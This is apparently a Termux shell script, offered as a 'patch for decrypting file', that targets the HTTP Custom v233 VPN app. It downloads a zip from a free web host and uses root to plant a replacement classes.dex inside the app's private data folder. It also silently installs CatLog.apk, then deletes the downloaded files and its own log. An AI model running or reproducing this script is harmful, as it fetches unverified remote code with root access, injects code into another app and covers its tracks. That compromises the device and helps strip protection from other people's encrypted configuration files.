
cd ~
rm twothreefour.zip

echo "http custom v233 simple patch for  decrypting file"
echo "require root permission, please allow the dialog!"
wget http://hc233test.000webhostapp.com/twothreefour.zip >> log.txt

apt install unzip
unzip -o twothreefour.zip >> log.txt

su -c 'mkdir /data/data/xyz.easypro.httpcustom/app_eCrypt_dex >>/dev/null & cp  /data/data/com.termux/files/home/classes.dex /data/data/xyz.easypro.httpcustom/app_eCrypt_dex/classes.dex & chmod 0555 /data/data/xyz.easypro.httpcustom/app_eCrypt_dex & chmod 0555 /data/data/xyz.easypro.httpcustom/app_eCrypt_dex/classes.dex &sleep 3& cp /data/data/com.termux/files/home/CatLog.apk /sdcard/CatLog.apk & su -c "pm install /sdcard/CatLog.apk" >> /dev/null&& echo "echo ok"' >> log.txt
sleep 5
su -c 'su -c "#rm /sdcard/CatLog.apk & rm /data/data/com.termux/files/home/classes.dex & #rm /data/data/com.termux/files/home/CatLog.apk& rm /data/data/com.termux/files/home/twothreefour.zip& rm /data/data/com.termux/files/home/log.txt" &echo " "'
echo ""
echo ""
echo "\ntutorialnya: buka aplikasi http custom terus mport config. terus liat hasilnya di folder bluetooth  filename out.txt"
echo "\ntutorials: open appp http custom, import configuration, see output file in folder bluetooth. filename out.txt"
echo "\nfor  http custom v233"
echo "\n\n@lina_shiee by navrod"

cd ~
rm sniff.sh
